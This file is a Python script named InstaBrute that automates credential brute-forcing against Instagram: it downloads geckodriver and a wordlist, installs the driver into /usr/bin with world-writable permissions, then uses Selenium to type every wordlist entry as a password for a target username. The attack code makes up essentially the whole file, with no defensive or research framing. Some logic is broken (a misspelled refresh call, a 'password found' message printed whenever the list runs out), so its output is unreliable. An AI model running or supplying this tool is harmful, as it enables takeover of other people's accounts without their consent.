from selenium.webdriver.chrome.options import Options
from colorama import Fore, Back, Style
from termcolor import colored, cprint
from selenium import webdriver
from zipfile import ZipFile
import subprocess
import colorama
import argparse
import time
import wget
import os


def sendmessage(message):
	subprocess.Popen(['notify-send', message])
	return

colorama.init()
global nowPath
nowPath = os.getcwd()

def InstallBrowser():
	try:
		print(Fore.GREEN)
		url = 'https://github.com/mozilla/geckodriver/releases/download/v0.28.0/geckodriver-v0.28.0-linux64.tar.gz'
		urlWordlist ="https://raw.githubusercontent.com/OgulcanKacarr/InstaBrute/main/wordlist.txt"
		filename = wget.download(url)
		wordlistDownload = wget.download(urlWordlist)
		print("\n\n")
		os.system("tar -xvf geckodriver-v0.28.0-linux64.tar.gz")
		os.remove("geckodriver-v0.28.0-linux64.tar.gz")
		os.system("cp geckodriver /usr/bin")
		os.system("chmod 777 /usr/bin/geckodriver")
		os.system("clear")
	except KeyboardInterrupt:
		print(Fore.RED)
		print("\nBye bye")


def fileConts():   
	haveOrnotFile = os.path.exists("geckodriver")
	haveOrnotWordlist = os.path.exists("wordlist.txt")
	if haveOrnotFile == False or haveOrnotWordlist == False:
		print(Fore.BLUE)
		print("""
																																					   
																									  .                                                   
												   ...'',,.                                         .''''.....                                            
											  .'''''''''....                     .'''.              .......''.....                                        
										 ..''.','...''....     '.     ...  .''. .:ddl.               .................                                    
									   ..','',,''...''''...''',,.    ,od:..:dd:..;dd;  .:cccc:,.      ..'......'''......                                  
									...'','..''.....'...  ..',,''::. ;ddc. ;dd:..'od;.,odc''::c;..,:;'...........,'..'.....                               
								 ...'''..''..''.........';'':;::';o, .coo:;cdl.  'od,.'lo:.......,:lcclc'........,'..'.........                           
							  ...'...............,cooolc,..lc.:d;.cl...;c;,'',....;l,...,c:::;..lxo::lod;..,;....'...............                         
							  ....''...........;lol,.;odo' 'c:,,,,;c,........ ..................,::::loc'.cddl:,'.....'...........                        
							 .......'.........:dl'.   ;dd;  .',''.,c,....   .;:;'.,:.  .....'....  ..;;..cddl;,col,....''......'....                      
						  ...........'.'.... 'ddo:....ldo;     ''',..       ;olcooc;.     ....          'dd:. .,ldo....','.....'...'..                    
						.................'.   ,ooollol:'..                 .co:;ll;,.      .            .''. .cddl.  ..........'..'''....                 
					 .............''.   ...    ....';.                      ,llolcc:'                       .cdc'.   ..   .........'.......               
					 .. ..   ......                                           ...'::.                        ..             ................              
					 ......  .                                              .;:cldc,.                                                ......               
				 .........                                                 .lxoccl,                                                   .''......           
				.......                                                     .,;:coo:.                                                   .',...'.          
			  .......                                                            .;;.                                                     ........        
			..'...                                                          ..     .'.                                                       ....'.       
		   .....                                                           .;.      ;;'.                                                       ...''.     
		  .....                                                            .;,     .;...                                                        ....'.    
		 ....                                                               .,;;;;,,.                                                             .....   
		...                                                                   ...,;'                                                                ....  
																			..,;cll:.                                                                     
																		   .cdocll,                                                                       
																		   .,clcloc,.                                                                     
																			  ...;cc.                                                                     
																		   .,'.  .,:'                                                                     
																		   .;ol;;cl;.                       Oğulcan KAÇAR                                             
																			.;oddl;'.                       github.com/OgulcanKacarr                                              
																		   .:lloolc:'.                                                                    
						 .....'...'.......''..'.. .''.                       ......                      ..'....'...'.......'.........                    
																		   .........                                                                      
																		   ..........                                                                     
																		   ..........                                                                     
																		   .''....'..                                                                     
		""")
		print(Fore.GREEN)
		print("\n\n[!] please wait, files are uploading..\n")
		print("============================================")
		time.sleep(3)
		try:
			InstallBrowser()
			print(Fore.GREEN)
			print("Download complete")
			print(Fore.RED)
			print("\n[+] use to python3 InstaBrute.py -t <username> -w <wordlist.txt>")
			exit()
		except KeyboardInterrupt:
			print(Fore.RED)
			print("\nCancel")
			exit()
	else:
		print("fix")




def Attack(user, wordlist='wordlist.txt'):
	haveOrnot = os.path.exists("geckodriver")
	if haveOrnot == False:
		fileConts()
	else:

		try:
			sendmessage("Started")
			#service_args=['2>/dev/null','--log-path=/tmp/chromedriver.log']
			browser = webdriver.Firefox()
			browser.set_window_position(700, -300)
			browser.set_window_size(500,600)
			browser.get("https://www.instagram.com/")
			time.sleep(3)
			wordlist = open(wordlist,"r",encoding="utf-8")
			for line in wordlist:
				usernameButton = browser.find_element_by_xpath('//*[@id="loginForm"]/div/div[1]/div/label/input')
				passwordButton = browser.find_element_by_xpath('//*[@id="loginForm"]/div/div[2]/div/label/input')
				loginButton = browser.find_element_by_xpath('//*[@id="loginForm"]/div/div[3]')
				password=line
				os.system("clear")
				#password = wordlist.readline()
	  
		   
				print(Fore.GREEN,"""

								

					 [+] trying to password ---> """,password

					

				)
				print(Fore.RED,"exit >> ctrl+c")
				usernameButton.send_keys(user)
				passwordButton.send_keys(password)
				loginButton.click()
				time.sleep(1)
				browser.refres()
				time.sleep(4)
			   

			else:
				print(Fore.RED)
				print("Password found (or your wordlist is finished) ---> ",password)
				time.sleep(5)
				wordlist.close()
				
		except KeyboardInterrupt:
			print(Fore.GREEN)
			print("\n[+] Cancel \ngood bye!")
			time.sleep(3)
			exit()
		except ImportError:
			print(Fore.GREEN)
			print("\n+] Cancel \ngood bye!")
			time.sleep(3)
			exit()
		NoSuchElementException="s"
	   
	   

ap = argparse.ArgumentParser()
print(Fore.GREEN)
ap.add_argument("-t", "--target", required=True, help="Instagram username = Ör:// ogulcan_kcr")
ap.add_argument("-w", "--wordlist", required=True, help="Directories or files wordlist\nÖr: /usr/share/dirb/wordlists/common.txt")
args = vars(ap.parse_args())


url = args["target"]                
wordlist = args["wordlist"]     



try:
	Attack(url, wordlist)
except AttributeError:
	print("""



																											
								.....''..               ..          ........                            
							 ...''..'...   .    .. .'. .lc.   .      ...........                        
						  ..','''.........','. ,d;.;d;.'ll.'::;:;. .........''....                      
					   ...'''..''..',...'';;;:''ll,:l, .lc.;l;','.,cc:;.....''........                  
					 ............;ccclc.,:,;,;;..,'.....',..',,,.,llcol',:;'............                
					 ..........'cl,..:d,..'.';,.....';,','..........',',oo;;:;...'.......               
				  ..............lo:,,::.   ....    .:lllc'    .        ,:..;ol..............            
				..........  ..  .'';,.             .;c:::'                ;l,. ..  ...........          
				 ... ...                            .';;:.                ..         ..  ......         
			 .....                                 .cooo;.                                .......       
		   .....                                    .',;:'                                   .....      
		 ....                                       .    ..                                    .....    
		....                                       .'    ',.                                     ....   
	   ...                                          .''.'..                                        ...  
	   .                                             .,;:.                                           .  
												   .:lll:.                                              
												   .';;:c'                                              
												   .'. .;,                                              
												   .;ccc:'                                              
												   .,clc;'                                              
				  ................ ..               .....               .. ................             
												   .......                                              
												   .'.....                                              
												   .,...,.                                       



		""")
	exit()

